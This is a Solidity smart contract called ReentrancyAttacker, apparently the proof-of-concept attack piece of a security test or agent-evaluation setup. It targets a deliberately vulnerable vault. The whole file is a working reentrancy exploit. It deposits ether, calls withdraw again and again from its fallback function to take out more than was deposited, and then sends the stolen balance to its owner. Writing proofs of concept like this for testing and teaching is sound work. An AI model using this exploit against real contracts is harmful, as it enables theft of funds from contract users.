// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/// @title ReentrancyAttacker - Attack contract used by Challenger agent's PoC
/// @notice Demonstrates the reentrancy exploit against VulnerableVault
contract ReentrancyAttacker {
    address public vault;
    address public owner;
    uint256 public attackCount;
    uint256 public maxReentrancy;

    constructor(address _vault, uint256 _maxReentrancy) {
        vault = _vault;
        owner = msg.sender;
        maxReentrancy = _maxReentrancy;
    }

    function attack(uint256 depositAmount) external payable {
        require(msg.value >= depositAmount, "Need funds");

        // Step 1: Deposit into vault
        (bool s1, ) = vault.call{value: depositAmount}(
            abi.encodeWithSignature("deposit()")
        );
        require(s1, "Deposit failed");

        // Step 2: Trigger withdrawal (will re-enter)
        attackCount = 0;
        (bool s2, ) = vault.call(
            abi.encodeWithSignature("withdraw(uint256)", depositAmount)
        );
        require(s2, "Withdraw failed");
    }

    receive() external payable {
        if (attackCount < maxReentrancy) {
            attackCount++;
            // Re-enter the vault's withdraw function
            (bool s, ) = vault.call(
                abi.encodeWithSignature("withdraw(uint256)", msg.value)
            );
            // Silently handle failure on last re-entry
            s;
        }
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }

    function drain() external {
        require(msg.sender == owner, "Not owner");
        (bool s, ) = owner.call{value: address(this).balance}("");
        require(s);
    }
}
